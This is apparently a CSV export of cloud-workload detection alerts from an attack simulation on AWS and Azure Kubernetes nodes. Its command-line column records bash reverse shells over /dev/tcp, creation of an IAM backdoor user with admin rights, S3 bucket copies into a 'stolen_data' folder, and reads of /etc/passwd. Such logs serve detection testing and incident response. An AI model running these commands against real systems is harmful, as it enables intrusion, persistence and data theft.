Severity,Time,Worker node,Host ID,Host type,Tactic & technique,Detection name,Container ID,File name,File path,Action taken,Environment,Cluster Name,Command line,Detection description,Detection ID,Image ID,Pod name,Namespace
Critical,2026-03-18T00:02:55Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws s3 sync s3://fcs-cnapp-client-data-7pko7aiv /tmp/stolen_data/bucket2/,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792175424503670-30128-26674704,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:47Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws s3 sync s3://fcs-cnapp-bucket /tmp/stolen_data/bucket1/,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792167031966034-30128-26672144,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:43Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws rds describe-db-instances --region us-east-1,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792163629707009-30128-26669584,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:39Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws s3 ls,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792159235140849-30128-26668048,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:35Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792154746883357-30128-26666000,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:30Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792150257996976-30128-26663952,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:26Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792145857864322-30128-26662672,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:21Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-access-key --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792141449386721-30128-26660112,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:17Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam attach-user-policy --user-name backdoor-user --policy-arn arn:aws:iam::aws:policy/AdministratorAccess,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792137019428717-30128-26658832,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:13Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws iam create-user --user-name backdoor-user,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792132529980084-30128-26656528,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
Critical,2026-03-18T00:02:11Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Execution via Command and Scripting Interpreter,"[
    ""GenReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,aws,/usr/local/aws-cli/v2/2.34.11/dist/aws,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,aws sts get-caller-identity,A reverse shell has been detected on your host. It may provide adversaries with an interactive terminal. Check the process tree to determine if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792127645805896-30128-26647312,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,cat,/usr/bin/cat,"Detection, standard detection.",AZURE,talon-cdr-aks,cat /etc/passwd,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123952644057-30103-180116240,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,bash,/usr/bin/bash,"Detection, standard detection.",AZURE,talon-cdr-aks,bash crowdstrike_test_high,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123945240947-30103-180113936,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,netstat,/usr/bin/netstat,"Detection, standard detection.",AZURE,talon-cdr-aks,netstat -anlp,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123965810375-30103-180117520,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:02:04Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Falcon Overwatch via Malicious Activity,"[
    ""TestTriggerHigh""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,bash,/usr/bin/bash,"Detection, standard detection.",AZURE,talon-cdr-aks,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:74a91aaa0ae044b59f188193524ebe70:1773792123945240947-10304-180114704,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:54Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Falcon Overwatch via Malicious Activity,"[
    ""TestTriggerHigh""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,bash,/usr/bin/bash,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,bash crowdstrike_test_high,A high level detection was triggered on this process for testing purposes.,ind:0b396650434e4da1b602560786e397b0:1773792114271245836-10304-26604560,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:15Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Falcon Intel via Intelligence Indicator - Domain,"[
    ""IntelDomainHigh""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,ping,/usr/bin/ping,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,ping -c 5 swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:0b396650434e4da1b602560786e397b0:1773792057234268465-4900-26322448,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:11Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,apt-get,/usr/bin/apt-get,"Detection, standard detection.",AZURE,talon-cdr-aks,apt-get install -y curl unzip wget dnsutils whois git python3 python3-pip procps net-tools nmap netcat-traditional tcpdump,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792071057158092-30103-179875856,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:01:05Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,apt-get,/usr/bin/apt-get,"Detection, standard detection.",AZURE,talon-cdr-aks,apt-get update,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792065085006547-30103-179850256,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:00:59Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Falcon Intel via Intelligence Indicator - Domain,"[
    ""IntelDomainHigh""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AWS_EC2_V2,talon_cdr_eks,nslookup swungheaving.com,A domain lookup matched a CrowdStrike Intelligence indicator that has previously been used in targeted attacks.,ind:0b396650434e4da1b602560786e397b0:1773792056896192725-4900-26286864,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:00:50Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,tee,/usr/bin/tee,"Detection, standard detection.",AZURE,talon-cdr-aks,tee -a /tmp/attack_log.log,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792050366209063-30103-179844368,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:00:50Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,nslookup,/usr/bin/nslookup,"Detection, standard detection.",AZURE,talon-cdr-aks,nslookup swungheaving.com,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792050372893668-30103-179845136,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:00:50Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,ping,/usr/bin/ping,"Detection, standard detection.",AZURE,talon-cdr-aks,ping -c 5 swungheaving.com,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792050729521842-30103-179845904,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:00:50Z,ip-172-20-3-37.us-west-2.compute.internal,0b396650434e4da1b602560786e397b0,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",a494e8b7c73543304fd496ac0cfeb33b063168494c33b3b5cde8c654b266ff84,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AWS_EC2_V2,talon_cdr_eks,"/bin/bash -c 
            exec 5<>/dev/tcp/172.20.4.168/4444;
            cat <&5 | while read line; do $line 2>&5 >&5; done
            ",Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:0b396650434e4da1b602560786e397b0:1773792050807892312-30103-26269456,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
High,2026-03-18T00:00:45Z,aks-falconnodes-31891780-vmss000002,74a91aaa0ae044b59f188193524ebe70,Server,Command and Control via Remote Access Tools,"[
    ""BashReverseShell""
   ]",c6477a7cf75bfcecc7d4e2feca1e175db798b86bdb0ab50969d92da07ac67447,bash,/usr/bin/bash,"Detection, process would have been killed if related prevention policy setting was enabled.",AZURE,talon-cdr-aks,bash -c bash -i >& /dev/tcp/172.20.4.4/4444 0>&1,Bash has created an interactive terminal for a remote host. Check the process tree to determine if malicious commands were executed and if this access was expected.,ind:74a91aaa0ae044b59f188193524ebe70:1773792045329164193-30103-179841808,18e5d8e75add0c0e41d875f3ea446fb0b5076287c04aa9620df179170df060a6,--,--
